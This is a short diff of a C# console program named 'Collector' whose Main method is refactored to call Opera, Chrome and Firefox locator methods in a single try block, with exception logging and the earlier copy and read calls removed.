@@ -1,9 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-
+using System.IO;
 
 namespace Collector
 {
@@ -11,47 +7,25 @@ namespace Collector
     {
         static void Main()
         {
-
-            Locator l = new Locator();
-            l.VariableDirectory();
+                
+               Locator l = new Locator();
             // For Opera
             try
             {
                 l.OperaLocator();
-                l.CopyFile();
-                l.Reader();
+                l.ChromeLocator();
+                l.MozillaLocator(); 
+                                            
             }
             catch(Exception ex)
             {
                 new LogWriter(ex.Message);
             }
 
-            // For Google Chrome
-            try
-            {
-                l.ChromeLocator();
-                l.CopyFile();
-                l.Reader();
-            }
-            catch (Exception ex)
-            {
-                new LogWriter(ex.Message);
-            }
-
-            // For Mozilla Firefox
-            try
-            {
-                l.MozillaLocator();
-                l.CopyFile();
-                l.Reader();
-            }
-            catch (Exception ex)
-            {
-                new LogWriter(ex.Message);
-            }
-
             Console.ReadLine();
         }
+      
+
     }
 
 } 
